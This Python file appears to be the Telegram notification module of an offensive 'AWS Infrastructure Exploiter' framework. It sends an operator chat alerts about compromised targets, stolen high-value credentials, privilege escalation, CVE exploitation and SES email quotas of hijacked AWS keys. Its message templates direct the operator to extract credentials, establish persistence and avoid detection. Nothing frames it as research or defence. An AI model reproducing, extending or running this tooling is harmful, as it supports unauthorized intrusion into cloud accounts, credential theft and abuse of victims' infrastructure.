#!/usr/bin/env python3
"""
📱 Enhanced Telegram Notifier
Advanced Telegram notifications for AWS infrastructure exploitation

Author: wKayaa
Date: 2025-01-28
"""

import aiohttp
import json
from datetime import datetime
from typing import Optional, Dict, List
import logging


class TelegramNotifier:
    """Enhanced Telegram notification service with AWS features"""
    
    def __init__(self, token: str, chat_id: str, max_message_length: int = 4096):
        self.token = token
        self.chat_id = chat_id
        self.max_message_length = max_message_length
        self.base_url = f"https://api.telegram.org/bot{token}"
        self.logger = logging.getLogger("TelegramNotifier")
        
        # Emoji mappings for different types
        self.emojis = {
            "success": "✅",
            "error": "❌", 
            "warning": "⚠️",
            "info": "ℹ️",
            "critical": "🚨",
            "aws": "☁️",
            "k8s": "🐳",
            "credentials": "🔑",
            "exploit": "🎯",
            "escalation": "📈",
            "cve": "💥"
        }
    
    async def initialize(self):
        """Initialize Telegram connection"""
        try:
            welcome_message = f"""
{self.emojis['success']} <b>AWS Infrastructure Exploiter Connected</b>

🚀 <b>Framework Status:</b> Ready
⏰ <b>Connected At:</b> {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}
🎯 <b>Mode:</b> AWS Infrastructure Exploitation
📱 <b>Notifications:</b> Enabled

<i>Real-time exploitation alerts active</i>
"""
            await self.send_message(welcome_message)
        except Exception as e:
            self.logger.error(f"⚠️ Telegram initialization failed: {str(e)}")
    
    async def send_message(self, message: str, disable_notification: bool = False) -> bool:
        """Send message to Telegram with chunking for long messages"""
        try:
            # Split long messages
            if len(message) > self.max_message_length:
                chunks = self._split_message(message)
                for chunk in chunks:
                    success = await self._send_single_message(chunk, disable_notification)
                    if not success:
                        return False
                return True
            else:
                return await self._send_single_message(message, disable_notification)
        except Exception as e:
            self.logger.error(f"Error sending Telegram message: {str(e)}")
            return False
    
    async def _send_single_message(self, message: str, disable_notification: bool = False) -> bool:
        """Send single message to Telegram"""
        try:
            async with aiohttp.ClientSession() as session:
                url = f"{self.base_url}/sendMessage"
                data = {
                    "chat_id": self.chat_id,
                    "text": message,
                    "parse_mode": "HTML",
                    "disable_notification": disable_notification
                }
                
                async with session.post(url, data=data) as response:
                    return response.status == 200
        except Exception:
            return False
    
    def _split_message(self, message: str) -> List[str]:
        """Split long message into chunks"""
        chunks = []
        while len(message) > self.max_message_length:
            # Find last newline before limit
            split_pos = message.rfind('\n', 0, self.max_message_length)
            if split_pos == -1:
                split_pos = self.max_message_length
            
            chunks.append(message[:split_pos])
            message = message[split_pos:]
        
        if message:
            chunks.append(message)
        
        return chunks
    
    async def send_aws_discovery_alert(self, discovery_result: Dict) -> bool:
        """Send AWS service discovery alert"""
        discovered_services = discovery_result.get("discovered_services", [])
        total_services = len(discovered_services)
        
        message = f"""
{self.emojis['aws']} <b>AWS Infrastructure Discovery</b>

🎯 <b>Targets Scanned:</b> {discovery_result.get('targets_scanned', 0)}
🔍 <b>Services Found:</b> {total_services}
⏰ <b>Timestamp:</b> {datetime.utcnow().strftime('%H:%M:%S UTC')}

<b>🔍 Discovered Services:</b>
"""
        
        for service in discovered_services[:10]:  # Limit to first 10
            target = service.get("target", "unknown")
            services = service.get("services", [])
            service_count = len(services)
            
            message += f"• <code>{target}</code> - {service_count} services\n"
            
        if total_services > 10:
            message += f"\n... and {total_services - 10} more services"
            
        return await self.send_message(message)
    
    async def send_exploitation_success(self, exploitation_result: Dict) -> bool:
        """Send successful exploitation alert"""
        target = exploitation_result.get("target", "unknown")
        service = exploitation_result.get("service", "unknown")
        method = exploitation_result.get("exploitation", {}).get("method", "unknown")
        
        message = f"""
{self.emojis['exploit']} <b>EXPLOITATION SUCCESS</b> {self.emojis['critical']}

🎯 <b>Target:</b> <code>{target}</code>
🔧 <b>Service:</b> {service.upper()}
⚡ <b>Method:</b> {method}
⏰ <b>Time:</b> {datetime.utcnow().strftime('%H:%M:%S UTC')}

{self.emojis['warning']} <b>Immediate Actions Required:</b>
• Validate access
• Extract credentials
• Document evidence
• Prepare persistence
"""
        
        return await self.send_message(message)
    
    async def send_credential_alert(self, credentials: List[Dict]) -> bool:
        """Send credential discovery alert"""
        if not credentials:
            return True
            
        high_value_creds = [c for c in credentials if c.get("risk_level") == "HIGH" or c.get("risk_level") == "CRITICAL"]
        
        message = f"""
{self.emojis['credentials']} <b>CREDENTIALS DISCOVERED</b> {self.emojis['critical']}

📊 <b>Total Found:</b> {len(credentials)}
🚨 <b>High Risk:</b> {len(high_value_creds)}
⏰ <b>Timestamp:</b> {datetime.utcnow().strftime('%H:%M:%S UTC')}

<b>🔑 High-Value Credentials:</b>
"""
        
        for cred in high_value_creds[:5]:  # Limit to first 5
            cred_type = cred.get("type", "unknown")
            confidence = cred.get("confidence", 0)
            source = cred.get("source", "unknown")
            
            message += f"""
• <b>{cred_type.upper()}</b>
  Confidence: {confidence:.1%}
  Source: <code>{source}</code>
"""
        
        if len(high_value_creds) > 5:
            message += f"\n... and {len(high_value_creds) - 5} more high-value credentials"
            
        message += f"\n\n{self.emojis['warning']} <b>Action:</b> Validate immediately!"
        
        return await self.send_message(message)
    
    async def send_privilege_escalation_alert(self, escalation_result: Dict) -> bool:
        """Send privilege escalation success alert"""
        method = escalation_result.get("method", "unknown")
        original_perms = len(escalation_result.get("original_permissions", []))
        escalated_perms = escalation_result.get("escalated_permissions", [])
        
        message = f"""
{self.emojis['escalation']} <b>PRIVILEGE ESCALATION SUCCESS</b> {self.emojis['critical']}

⚡ <b>Method:</b> {method.replace('_', ' ').title()}
📊 <b>Original Permissions:</b> {original_perms}
🚀 <b>Escalated To:</b> {', '.join(escalated_perms[:3])}
⏰ <b>Timestamp:</b> {datetime.utcnow().strftime('%H:%M:%S UTC')}

{self.emojis['critical']} <b>CRITICAL ALERT:</b>
Administrative access potentially achieved!

<b>Next Steps:</b>
• Document current access
• Extract additional credentials
• Establish persistence
• Avoid detection
"""
        
        return await self.send_message(message)
    
    async def send_cve_exploitation_alert(self, cve_results: List[Dict]) -> bool:
        """Send CVE exploitation results"""
        if not cve_results:
            return True
            
        successful_exploits = [r for r in cve_results if r.get("success")]
        
        message = f"""
{self.emojis['cve']} <b>CVE EXPLOITATION RESULTS</b>

📊 <b>Attempts:</b> {len(cve_results)}
✅ <b>Successful:</b> {len(successful_exploits)}
⏰ <b>Timestamp:</b> {datetime.utcnow().strftime('%H:%M:%S UTC')}

<b>💥 Successful Exploits:</b>
"""
        
        for exploit in successful_exploits[:5]:  # Limit to first 5
            cve_id = exploit.get("cve_id", "unknown")
            target = exploit.get("target", "unknown")
            impact = exploit.get("severity_impact", "unknown")
            
            message += f"""
• <b>{cve_id}</b>
  Target: <code>{target}</code>
  Impact: {impact}
"""
        
        if len(successful_exploits) > 5:
            message += f"\n... and {len(successful_exploits) - 5} more successful exploits"
            
        return await self.send_message(message)
    
    async def send_aws_health_status(self, health_results: Dict) -> bool:
        """Send AWS service health status"""
        valid_creds = health_results.get("valid_credentials", 0)
        total_tested = health_results.get("total_tested", 0)
        ses_quota = health_results.get("ses_quota", {})
        
        message = f"""
{self.emojis['aws']} <b>AWS Health Status</b>

🔑 <b>Valid Credentials:</b> {valid_creds}/{total_tested}
📧 <b>SES Daily Limit:</b> {ses_quota.get('daily_limit', 'N/A')}
📊 <b>SES Sent Today:</b> {ses_quota.get('sent_today', 'N/A')}
⏰ <b>Last Check:</b> {datetime.utcnow().strftime('%H:%M:%S UTC')}

<b>🎯 Service Status:</b>
"""
        
        services = health_results.get("services", {})
        for service, status in services.items():
            status_emoji = self.emojis['success'] if status else self.emojis['error']
            message += f"• {service.upper()}: {status_emoji}\n"
            
        return await self.send_message(message, disable_notification=True)
    
    async def send_scan_progress(self, current: int, total: int, found_services: int) -> bool:
        """Send scanning progress update"""
        progress = (current / total) * 100 if total > 0 else 0
        
        message = f"""
📊 <b>Scan Progress Update</b>

🎯 <b>Progress:</b> {current}/{total} ({progress:.1f}%)
🔍 <b>Services Found:</b> {found_services}
⏰ <b>Timestamp:</b> {datetime.utcnow().strftime('%H:%M:%S UTC')}

{"▓" * int(progress/5)}{"░" * (20-int(progress/5))} {progress:.1f}%
"""
        
        return await self.send_message(message, disable_notification=True)
    
    async def send_final_summary(self, summary: Dict) -> bool:
        """Send final exploitation summary"""
        message = f"""
🏁 <b>AWS EXPLOITATION COMPLETE</b>

📊 <b>Final Statistics:</b>
• Targets Scanned: {summary.get('targets_scanned', 0)}
• Services Discovered: {summary.get('services_discovered', 0)}
• Successful Exploits: {summary.get('successful_exploits', 0)}
• Credentials Found: {summary.get('credentials_found', 0)}
• Privilege Escalations: {summary.get('privilege_escalations', 0)}
• CVE Exploits: {summary.get('cve_exploits', 0)}

⏰ <b>Duration:</b> {summary.get('duration', 'N/A')}
🎯 <b>Success Rate:</b> {summary.get('success_rate', 0):.1%}

{self.emojis['success']} <b>Operation Completed Successfully!</b>
"""
        
        return await self.send_message(message)
    
    async def send_error_alert(self, error_message: str, context: str = "") -> bool:
        """Send error alert"""
        message = f"""
{self.emojis['error']} <b>Error Alert</b>

🚨 <b>Error:</b> {error_message}
📍 <b>Context:</b> {context}
⏰ <b>Timestamp:</b> {datetime.utcnow().strftime('%H:%M:%S UTC')}
"""
        
        return await self.send_message(message)
    
    async def send_custom_alert(self, title: str, content: Dict, alert_type: str = "info") -> bool:
        """Send custom formatted alert"""
        emoji = self.emojis.get(alert_type, self.emojis['info'])
        
        message = f"{emoji} <b>{title}</b>\n\n"
        
        for key, value in content.items():
            if isinstance(value, (list, dict)):
                value = json.dumps(value, indent=2)
            message += f"<b>{key}:</b> {value}\n"
        
        message += f"\n⏰ <b>Timestamp:</b> {datetime.utcnow().strftime('%H:%M:%S UTC')}"
        
        return await self.send_message(message)